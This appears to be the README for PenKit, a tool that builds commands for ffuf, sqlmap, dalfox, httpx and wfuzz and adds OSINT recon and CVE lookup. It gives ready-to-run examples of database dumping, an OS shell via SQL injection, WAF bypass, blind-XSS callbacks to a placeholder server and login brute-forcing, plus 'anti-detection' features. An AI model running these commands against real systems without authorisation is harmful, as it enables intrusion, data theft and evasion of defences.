# PenKit — Unified Penetration Testing Command Builder

[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/flask-3.1%2B-green)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/license-MIT-orange)](LICENSE)

PenKit generates correct, ready-to-run commands for five security tools. It eliminates manual flag memorization, reduces syntax errors, and adds anti-detection features like random User-Agent injection.

**Supports:** `ffuf` · `sqlmap` · `dalfox` · `httpx` · `wfuzz`

---

## Table of Contents

1. [Installation](#installation)
2. [Usage](#usage)
3. [Web UI](#web-ui)
4. [API Key Manager](#api-key-manager)
5. [Recon Module](#recon-module)
6. [Reports](#reports)
7. [Vulnerability & CVE Scanning](#vulnerability--cve-scanning)
8. [Tool Commands Reference](#tool-commands-reference)
9. [Project Structure](#project-structure)
10. [Build](#build)

---

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/penkit.git
cd penkit

# Virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install flask rich pyinstaller

# Install pentest tools
bash install_tools.sh

# Run CLI
python3 penkit.py

# Run Web UI
python3 -m webapp
# Visit http://localhost:8080
```

### Standalone Binaries

Pre-built binaries are included:
- `penkit_linux_x86_64` — CLI binary (12MB, no Python required)
- `penkit-web_linux_x86_64` — Web app binary (12MB, no Python required)

```bash
chmod +x penkit_linux_x86_64 ./penkit-web_linux_x86_64
./penkit_linux_x86_64 --help
./penkit-web_linux_x86_64
```

---

## Usage

### Interactive Mode

```bash
python3 penkit.py
```

Select a tool from the menu, fill in parameters, then choose action: **run**, **dryrun**, **copy**, or **skip**.

### CLI Flags

```bash
penkit --tool ffuf        Build ffuf command interactively
penkit --history          Show command history
penkit --status           Check tool availability
penkit --version          Show version info
```

---

## Web UI

```bash
python3 -m webapp
# Open http://localhost:8080
```

**Features:**
- Dashboard with tool status grid
- Per-tool command builders with live preview
- Session history (last 50 commands)
- Recon module (14 OSINT integrations)
- API key management
- Dry-run and live execution with output capture
- **Auto-generated scan reports (HTML & JSON) after every run**

### Recent Bug Fixes

- **ffuf extension format:** Fixed `-e` flag to use comma-separated values without leading dots (e.g. `php,html,asp` instead of `.php,.html,.asp`)
- **wfuzz proxy/tor conflict:** Fixed duplicate `-p` flag when both proxy and Tor are enabled; Tor takes precedence
- **sqlmap random agent injection:** Fixed to use `-H 'User-Agent: ...'` consistently instead of redundant `--headers` flag

---

## API Key Manager

Store API keys securely for recon module services.

**Key locations (priority order):**
1. Environment variables (highest)
2. `~/.penkit_config.json` (chmod 600)
3. Interactive prompt (fallback)

**Supported services:** Shodan, VirusTotal, SecurityTrails, Censys, Censys Secret, Hunter.io, HaveIBeenPwned, WhoisXML, BinaryEdge, FullHunt

```bash
# From CLI
python3 penkit_keys.py

# From web UI
# Navigate to http://localhost:8080/keys
```

---

## Recon Module

14 OSINT integrations accessible from CLI or web UI.

| # | Service | Function | Input | Output |
|---|---------|----------|-------|--------|
| 1 | Shodan | `shodan_host()` | IP | Open ports, CVE list, org, country |
| 2 | Shodan | `shodan_search()` | Query | IP, port, org, product per match |
| 3 | VirusTotal | `vt_url()` | URL | Malicious/suspicious/clean stats |
| 4 | VirusTotal | `vt_ip()` | IP | Reputation across engines |
| 5 | VirusTotal | `vt_hash()` | Hash | Detection ratio, first seen |
| 6 | SecurityTrails | `securitytrails_subdomains()` | Domain | Subdomain list + FQDN |
| 7 | SecurityTrails | `securitytrails_dns()` | Domain | Current DNS records |
| 8 | Censys | `censys_ip()` | IP | Services, ports, TLS certs |
| 9 | Hunter.io | `hunter_domain()` | Domain | Email, type, confidence, name |
| 10 | Hunter.io | `hunter_verify()` | Email | Valid/risky/invalid + score |
| 11 | HaveIBeenPwned | `hibp_account()` | Email | Breach name, date, data classes |
| 12 | WhoisXML | `whoisxml_lookup()` | Domain | Registrar, dates, nameservers |
| 13 | BinaryEdge | `binaryedge_ip()` | IP | Ports, CVEs, exposed services |
| 14 | FullHunt | `fullhunt_domain()` | Domain | Hosts, IPs, CDN, tags |

---

## Reports

Every scan executed through the Web UI automatically generates a report in both **HTML** and **JSON** formats. Reports are stored locally and can be accessed, viewed, and downloaded at any time.

### Report Contents

Each report includes:
- Tool name and command executed
- Timestamp of execution
- Full stdout/stderr output
- Execution status (success, timeout, error)
- Random User-Agent that was injected
- Target parameters used

### Accessing Reports

**From the Web UI:**
- Navigate to the **Reports** section from the dashboard
- Click any report to view the HTML version
- Download the raw JSON for further analysis

**Direct endpoints:**

| Path | Method | Description |
|------|--------|-------------|
| `/reports` | GET | List all reports |
| `/report/<id>` | GET | View report as HTML |
| `/report/<id>/json` | GET | Download report as JSON |
| `/report/<id>/html` | GET | Download report as HTML |

### Report Storage

Reports are stored in `~/.penkit_reports/` with the following structure:
```
~/.penkit_reports/
├── report_001.json
├── report_001.html
├── report_002.json
├── report_002.html
└── ...
```

- **Max reports:** 200 (older reports are auto-rotated)
- **Permissions:** Owner read/write only (chmod 600)
- **Shared:** Available to both CLI and Web UI sessions

---

## Vulnerability & CVE Scanning

PenKit includes a built-in vulnerability and CVE scanner powered by the **NVD (National Vulnerability Database)** API. It can scan URLs, IPs, and technologies to identify known CVEs.

### Scan Types

| Scan Type | Description | Example Input |
|-----------|-------------|---------------|
| **URL Scan** | Detect technologies from HTTP headers/body and lookup CVEs | `https://target.com` |
| **IP Scan** | Port scan common services and lookup CVEs | `192.168.1.1` |
| **Keyword Search** | Search CVEs by product/technology name | `Apache`, `Nginx`, `WordPress` |
| **CPE Lookup** | Lookup CVEs by exact CPE string | `cpe:2.3:a:apache:http_server:2.4.49` |

### NVD API Key

For higher rate limits, configure your free NVD API key:

```bash
# Option 1: Environment variable
export NVD_API_KEY="your-key-here"

# Option 2: Via PenKit key manager
python3 penkit_keys.py
# Select "NVD (National Vulnerability Database)"

# Option 3: Directly in config
nano ~/.penkit_config.json
# Add: "nvd": "your-key-here"
```

Get a free API key: https://nvd.nist.gov/developers/request-an-api-key

### CLI Usage

```bash
# From main menu
python3 penkit.py
# Type 'vuln' or select option 6

# Or launch directly
python3 penkit_vuln.py
```

### Web UI Usage

Navigate to **🛡️ Vuln Scan** from the dashboard or visit `/vuln`.

### API Endpoints

| Path | Method | Description |
|------|--------|-------------|
| `/vuln` | GET | Vulnerability scan page |
| `/api/vuln/scan_url` | POST | Scan URL for tech + CVEs |
| `/api/vuln/scan_ip` | POST | Scan IP for services + CVEs |
| `/api/vuln/search_cve` | POST | Search CVEs by keyword |
| `/api/vuln/lookup_cpe` | POST | Lookup CVEs by CPE string |

### Example Output

```
CVE ID          Severity   Score   Technology    Description
CVE-2021-41773  HIGH       7.5     Apache        Path traversal in Apache 2.4.49
CVE-2021-42013  HIGH       7.5     Apache        Path traversal in Apache 2.4.50
CVE-2021-40438  MEDIUM     4.3     Apache HTTPD  SSRF via mod_proxy
```

### Integration with Other Tools

All tool builders include a **"vuln"** action that launches the CVE scanner after command generation:

- **ffuf** → Scan discovered paths for tech + CVEs
- **sqlmap** → Scan exploited DB for CVEs
- **dalfox** → Scan XSS-vulnerable endpoints for tech + CVEs
- **httpx** → Enable `-tech-detect` + post-scan CVE lookup
- **wfuzz** → Scan discovered paths for tech + CVEs

---

## Tool Commands Reference

**Purpose:** Directory, file, parameter, and vhost brute-forcing

```bash
ffuf -u 'https://target.com/FUZZ' -w '/path/to/wordlist.txt'
```

| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Target URL (use FUZZ keyword) | `-u 'https://target.com/FUZZ'` |
| `-w` | Wordlist path | `-w '/usr/share/wordlists/dirb/common.txt'` |
| `-t` | Threads | `-t 40` |
| `-mc` | Match HTTP codes | `-mc 200,301,302,403` |
| `-fs` | Filter by response size | `-fs 0` |
| `-e` | File extensions | `-e php,html,asp` |
| `-X` | HTTP method | `-X POST` |
| `-H` | Custom header | `-H 'Authorization: Bearer token'` |
| `-d` | POST data | `-d 'param1=FUZZ&param2=test'` |
| `-recursion` | Enable recursion | `-recursion` |
| `-r` | Follow redirects | `-r` |
| `-s` | Silent mode | `-s` |
| `-x` | Proxy | `-x 'http://127.0.0.1:8080'` |
| `-o` | Output file | `-o results.json -of json` |

**Examples:**

```bash
# Directory fuzzing
ffuf -u 'https://target.com/FUZZ' -w '/usr/share/wordlists/dirb/common.txt' -t 40 -mc 200,301,302,403

# Parameter fuzzing
ffuf -u 'https://target.com/page?id=FUZZ' -w params.txt -X POST -d 'username=admin&password=FUZZ'

# With custom headers and proxy
ffuf -u 'https://target.com/FUZZ' -w wl.txt -H 'Authorization: Bearer token' -x 'http://127.0.0.1:8080'

# Recursive fuzzing with output
ffuf -u 'https://target.com/FUZZ' -w wl.txt -recursion -o results.json -of json
```

---

### sqlmap — SQL Injection Scanner

**Purpose:** Automated SQL injection detection and exploitation

```bash
sqlmap -u 'https://target.com/page?id=1' --level=1 --risk=1 --batch
```

| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Target URL with parameter | `-u 'https://target.com/page?id=1'` |
| `--data` | POST data | `--data='param1=test&param2=FUZZ'` |
| `--cookie` | Cookie header | `--cookie='PHPSESSID=abc123'` |
| `--level` | Test level (1-5) | `--level=3` |
| `--risk` | Risk level (1-3) | `--risk=2` |
| `--dbms` | Force DBMS | `--dbms=MySQL` |
| `--threads` | Threads (1-10) | `--threads=5` |
| `--tamper` | Tamper scripts | `--tamper=space2comment,randomcase` |
| `--dbs` | Enumerate databases | `--dbs` |
| `--tables` | enumerate tables | `--tables` |
| `--dump` | Dump database | `--dump` |
| `--os-shell` | Attempt OS shell | `--os-shell` |
| `--tor` | Use Tor | `--tor --tor-type=SOCKS5` |
| `--batch` | No user prompts | `--batch` |
| `--random-agent` | Random user-agent | `--random-agent` |
| `--proxy` | Proxy | `--proxy='http://127.0.0.1:8080'` |
| `-H` | Extra headers | `-H 'X-Forwarded-For: 127.0.0.1'` |

**Examples:**

```bash
# Basic SQL injection test
sqlmap -u 'https://target.com/page?id=1' --level=1 --risk=1 --batch

# Enumerate databases
sqlmap -u 'https://target.com/page?id=1' --dbs --batch

# Dump specific table
sqlmap -u 'https://target.com/page?id=1' -D db_name -T users --dump --batch

# POST request with custom headers and proxy
sqlmap -u 'https://target.com/login' --data='user=admin&pass=test' -H 'X-Custom: header' --proxy='http://127.0.0.1:8080' --batch

# OS shell via SQL injection
sqlmap -u 'https://target.com/page?id=1' --os-shell --batch

# Bypass WAF with tamper scripts
sqlmap -u 'https://target.com/page?id=1' --tamper=space2comment,randomcase --level=5 --risk=3 --batch
```

---

### dalfox — XSS Scanner

**Purpose:** XSS vulnerability scanning with parameter mining and blind XSS support

```bash
dalfox url 'https://target.com/search?q=test' --worker 100 --timeout 10
```

| Flag | Description | Example |
|------|-------------|---------|
| Mode | Scan mode | `url`, `pipe`, `file`, `sxss` |
| `--cookie` | Cookie | `--cookie 'PHPSESSID=abc123'` |
| `--header` | Custom header | `--header 'Authorization: Bearer token'` |
| `--data` | POST data | `--data 'param1=test&param2=FUZZ'` |
| `--worker` | Worker threads | `--worker 100` |
| `--timeout` | Timeout (seconds) | `--timeout 10` |
| `--custom-payload` | Custom payload file | `--custom-payload '/path/to/payloads.txt'` |
| `--blind` | Blind XSS callback | `--blind 'https://your-xss-server.com'` |
| `--proxy` | Proxy | `--proxy 'http://127.0.0.1:8080'` |
| `--waf-evasion` | Enable WAF evasion | `--waf-evasion` |
| `--mining-parameters` | Mine parameters from URL | `--mining-parameters` |
| `--follow-redirects` | Follow redirects | `--follow-redirects` |
| `--skip-bav` | Skip BAV | `--skip-bav` |
| `--format` | Output format | `--format json` |
| `--output` | Output file | `--output results.txt` |

**Examples:**

```bash
# URL scanning
dalfox url 'https://target.com/search?q=test' --worker 100 --timeout 10

# POST data scanning with mining
dalfox url 'https://target.com/search' --data 'search=FUZZ' --mining-parameters --worker 50

# Blind XSS testing
dalfox url 'https://target.com/comment' --blind 'https://your-xss-server.com' --data 'comment=FUZZ'

# Pipe mode (stdin)
echo 'https://target.com/page?q=test' | dalfox pipe

# File mode with output
dalfox file urls.txt --output results.txt --format json
```

---

### httpx — HTTP Toolkit

**Purpose:** Fast HTTP probing, technology detection, and reconnaissance

```bash
httpx -l 'targets.txt' -p 80,443 -t 50 -sc -title -tech-detect
```

| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Single URL | `-u 'https://target.com'` |
| `-l` | File with URLs | `-l 'targets.txt'` |
| `-p` | Ports to probe | `-p 80,443,8080` |
| `-t` | Threads | `-t 50` |
| `-rl` | Rate limit (req/s) | `-rl 150` |
| `-mc` | Match status codes | `-mc 200,301,302` |
| `-sc` | Show status code | `-sc` |
| `-title` | Show page title | `-title` |
| `-tech-detect` | Technology detection | `-tech-detect` |
| `-ip` | Show IP address | `-ip` |
| `-cl` | Show content length | `-cl` |
| `-cname` | Show CNAME | `-cname` |
| `-tls-probe` | TLS info | `-tls-probe` |
| `-follow-redirects` | Follow redirects | `-follow-redirects` |
| `-probe` | Show probe status | `-probe` |
| `-silent` | Silent mode | `-silent` |
| `-json` | JSON output lines | `-json` |
| `-o` | Output file | `-o results.txt` |
| `-http-proxy` | Proxy | `-http-proxy 'http://127.0.0.1:8080'` |

**Examples:**

```bash
# Probe targets from file
httpx -l targets.txt -p 80,443 -t 50 -sc -title

# Technology detection with JSON output
httpx -l targets.txt -tech-detect -json -o results.json

# Single URL with full info
httpx -u 'https://target.com' -sc -title -ip -cl -cname -tls-probe

# Fast silent scan
httpx -l targets.txt -silent -o live_hosts.txt
```

---

### wfuzz — Web Application Fuzzer

**Purpose:** Advanced web fuzzing with powerful filtering and payload management

```bash
wfuzz -w '/usr/share/wordlists/dirb/common.txt' -t 10 --hc 404 'https://target.com/FUZZ'
```

| Flag | Description | Example |
|------|-------------|---------|
| `-w` | Wordlist path | `-w '/usr/share/wordlists/dirb/common.txt'` |
| `-t` | Threads | `-t 10` |
| `--hc` | Hide HTTP codes | `--hc 404,400` |
| `--sc` | Show only these codes | `--sc 200,301` |
| `--hw` | Hide by word count | `--hw 1234` |
| `--hl` | Hide by line count | `--hl 50` |
| `--hh` | Hide by char count | `--hh 1000` |
| `-X` | HTTP method | `-X POST` |
| `-d` | POST data | `-d 'param1=FUZZ&param2=test'` |
| `-H` | Custom header | `-H 'Authorization: Bearer token'` |
| `-b` | Cookie | `-b 'PHPSESSID=abc123'` |
| `-p` | Proxy | `-p 'http://127.0.0.1:8080'` |
| `-v` | Verbose output | `-v` |
| `--color` | Colorized output | `--color` |
| `-f` | Output file | `-f 'results,html'` |

**Payload markers:** `FUZZ`, `FUZ2Z`, `FUZ3Z`, etc. for multiple payloads

**Examples:**

```bash
# Directory fuzzing
wfuzz -w '/usr/share/wordlists/dirb/common.txt' -t 10 --hc 404 'https://target.com/FUZZ'

# POST parameter fuzzing
wfuzz -w params.txt -t 10 -X POST -d 'username=admin&password=FUZZ' 'https://target.com/login'

# Multiple payloads (intersection)
wfuzz -w users.txt -w passwords.txt -t 10 'https://target.com/login?user=FUZZ&pass=FUZ2Z'

# Filter by size and save results
wfuzz -w wl.txt --hw 1234 --hl 50 -f 'results,json' 'https://target.com/FUZZ'

# With proxy and custom headers
wfuzz -w wl.txt -t 10 -H 'X-Custom: header' -p 'http://127.0.0.1:8080' 'https://target.com/FUZZ'
```

---

## Project Structure

```
penkit/
├── penkit.py                    # CLI entry — interactive mode, --tool, --history, --status
├── penkit_recon.py              # Recon API module — 14 OSINT endpoint wrappers
├── penkit_keys.py               # API key manager — env → config → prompt
├── penkit_bundle.sh             # Single-file project bundle script
├── penkit_bundle.spec           # PyInstaller spec for CLI binary
├── webapp_linux_x86_64.spec     # PyInstaller spec for web app binary
├── install_tools.sh             # Linux pentest tool installer (apt + go)
├── README.md                    # This file
├── INSTALL.md                   # Installation guide
├── IMPLEMENTATION.md            # Technical documentation
│
├── webapp/                      # Flask web application source
│   ├── __init__.py              # create_app(), Flask factory
│   ├── routes.py                # All HTTP routes (25 endpoints)
│   ├── utils.py                 # Shared helpers: tool status, history, random agents, reports
│   ├── templates/
│   │   ├── base.html            # Layout shell — header, nav, footer
│   │   ├── index.html           # Dashboard — tool grid, history, quick launch
│   │   ├── builder.html         # Per-tool command builder with anti-detection
│   │   ├── recon.html           # 14-module OSINT launch pad
│   │   ├── keys.html            # API key CRUD + bulk upload + env export
│   │   ├── reports.html         # Scan reports listing
│   │   └── report.html          # Individual report viewer
│   └── static/                  # (reserved for custom CSS/JS)
│
├── __pycache__/                 # Compiled bytecode (auto-generated, ignored)
└── .git/                        # Git repository
```

---

## Build

### Prerequisites

```bash
python3 -m venv venv
source venv/bin/activate
pip install flask pyinstaller rich
```

### Build CLI Binary

```bash
pyinstaller penkit_bundle.spec
# Output: dist/penkit (~12MB standalone Linux binary)
```

### Build Web App Binary

```bash
pyinstaller webapp_linux_x86_64.spec
# Output: dist/penkit-web (~12MB standalone Flask server)
```

---

## API Endpoints

### Pages

| Path | Method | Description |
|------|--------|-------------|
| `/vuln` | GET | Vulnerability & CVE scan page |
| `/` | GET | Dashboard |
| `/reports` | GET | Scan reports list |
| `/report/<id>` | GET | View report as HTML |
| `/report/<id>/json` | GET | Download report as JSON |
| `/report/<id>/html` | GET | Download report as HTML |
| `/builder/<tool>` | GET | Command builder (ffuf, sqlmap, dalfox, httpx, wfuzz) |
| `/recon` | GET | Recon module selector |
| `/keys` | GET | API key management |

### JSON API

| Path | Method | Description |
|------|--------|-------------|
| `/status` | GET | Tool availability (found/missing/path) |
| `/history` | GET | Session command history |
| `/clear-history` | POST | Clear all history |
| `/generate` | POST | Build command from form params |
| `/run` | POST | Execute command (120s timeout) or dry-run |
| `/copy` | POST | Copy to clipboard |
| `/api/random-agent` | GET | Random User-Agent string |
| `/api/recon/<service>` | POST | Run OSINT query |
| `/api/keys/status` | GET | Key status (10 services) |
| `/api/keys/save` | POST | Bulk save keys |
| `/api/keys/delete` | POST | Delete keys |
| `/api/keys/export` | GET | Env export snippet |
| `/api/vuln/scan_url` | POST | Scan URL for tech + CVEs |
| `/api/vuln/scan_ip` | POST | Scan IP for services + CVEs |
| `/api/vuln/search_cve` | POST | Search CVEs by keyword |
| `/api/vuln/lookup_cpe` | POST | Lookup CVEs by CPE string |
| `/reports` | GET | List all scan reports |
| `/report/<id>` | GET | View report as HTML |
| `/report/<id>/json` | GET | Download report as JSON |
| `/report/<id>/html` | GET | Download report as HTML |

---

## Anti-Detection Features

- **Random User-Agent**: 15 real browser UA strings injected per command
- **Random IP hints**: Where supported by tool
- **UA injection by tool**: Each tool receives the correct flag format

| Tool | Method | Example |
|------|--------|---------|
| ffuf | `-H 'User-Agent: ...'` | Appends `-H` flag |
| wfuzz | `-H 'User-Agent: ...'` | Appends `-H` flag |
| httpx | `-H 'User-Agent: ...'` | Appends `-H` flag |
| sqlmap | `-H 'User-Agent: ...'` | Appends `-H` flag |
| dalfox | `--header 'User-Agent: ...'` | Replaces or appends `--header` |

---

## Recent Bug Fixes

- **ffuf extension syntax:** Changed from `-e .php,.html,.asp` to `-e php,html,asp` (ffuf expects no leading dots)
- **wfuzz proxy/tor conflict:** Fixed duplicate `-p` flag generation; when Tor is enabled, proxy is skipped to avoid conflicts
- **sqlmap random agent:** Fixed injection to use `-H 'User-Agent: ...'` instead of redundant `--headers` flag
- **Web App static folder:** Created missing `webapp/static/` directory required by Flask
- **PyInstaller spec path:** Removed hardcoded `/home/johnwick/Projects/penkit` from `webapp_linux_x86_64.spec`
- **install_tools.sh:** Fixed incorrect `pip install sqlmap`; sqlmap is now installed via `apt-get install sqlmap`
- **Report generation:** Added auto-generated HTML and JSON reports after every scan execution

## Data Files

### Session File
- **Path:** `~/.penkit_session.json`
- **Max entries:** 50 (FIFO eviction)
- **Shared:** Between CLI and web app

### Config File
- **Path:** `~/.penkit_config.json`
- **Permissions:** `chmod 0600` (owner read/write only)

---

## Version

**PenKit v1.0.0**
**Python:** 3.9+
**Flask:** 3.1+
**Platform:** Linux x86_64
